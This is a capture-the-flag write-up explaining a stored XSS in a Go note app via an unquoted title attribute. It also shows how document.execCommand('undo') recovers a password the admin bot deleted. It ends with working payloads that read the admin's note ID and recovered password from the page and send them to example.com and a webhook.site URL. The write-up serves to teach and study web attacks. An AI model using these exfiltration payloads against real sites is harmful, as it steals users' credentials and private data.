+ aim is to capture the flags written in the notes posted by the admin bot.
+ Lets break down the code:
```
var notes map[string]Note = map[string]Note{}
var masterKey string

var linkPattern = regexp.MustCompile(`\[([0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[0-9a-f]{4}-[0-9a-f]{12})\]`)

// replace [(note ID)] to links
func replaceLinks(note string) string {
	return linkPattern.ReplaceAllStringFunc(note, func(s string) string {
		id := strings.Trim(s, "[]")

		note, ok := notes[id]
		if !ok {
			return s
		}

		title := html.EscapeString(note.Title)
		return fmt.Sprintf(
			"<a href=/note/%s title=%s>%s</a>", id, title, title,
		)
	})
}

// escape note to prevent XSS first, then replace newlines to <br> and render links
func renderNote(note string) string {
	note = html.EscapeString(note)
	note = strings.ReplaceAll(note, "\n", "<br>")
	note = replaceLinks(note)
	return note
}
```
`var linkPattern = regexp.MustCompile(`\[([0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[0-9a-f]{4}-[0-9a-f]{12})\]`)` defines a regular expression pattern using the regexp.MustCompile() function. The pattern is intended to match a specific format: [...] where the content inside the brackets matches a UUID format 
-  It uses the linkPattern regular expression to find matches in the input note string and replaces those matches with HTML links and  and creating an HTML link with the note's title as the link text.
-  html.EscapeString() function is used to escape any special characters in the title to prevent potential cross-site scripting (XSS) vulnerabilities

In bot's index.js,
```
const len = (await page.$eval('input', el => el.value)).length;
            await page.focus('input');
            for (let i = 0; i < len; i++) {
                await page.keyboard.press('Backspace');
            }
```
The purpose of this code is to delete the content of an input field on the web page, specifically for removing a password value that might have been autofilled or prepopulated by the browser.
page.keyboard.press() method to simulate pressing the 'Backspace' key as many times as the length of the input value (len). This effectively deletes the entire content of the input field character by character.
+ There is an API document.execCommand that you can do some special commands on a browser, and looking through this document, you could find undo command, which enables you to recover the text deleted from input.
  + `< a  href = /note/xxx-xxx-xxx  title = x  autofocus  onfocus = console.log(location) > x autofocus onfocus=console.log(location) </ a >`
    XSS Possible and a tag created
+ Finally, by letting admin to execute this code using XSS , you could get the ID of admin's note and the master key.
```
const h = localStorage.getItem( 'neko-note-history' );
 const id = JSON.parse(h) [ 0 ] .id;
 document .execCommand( 'undo' );
 const pw = document .querySelector( 'input' ).value;
navigator.sendBeacon( `https://example.com/?id= ${id} &pw= ${pw} ` );
```
Payload: xxxxxxxxxxxxxxxxxxxx onmouseover=document.execCommand(`undo`);pwd=document.querySelector(`input`).value;id=JSON.parse(localStorage.getItem(`neko-note-history`))[0].id;location=`https://webhook.site/9a5f00d1-194c-46af-b09a-b488a79d2787?id=`+id+`&pwd=`+pwd



Original Writeup:


https://gist.github.com/lebr0nli/4a6a53e6825d83cfe74aa8eb370895f0
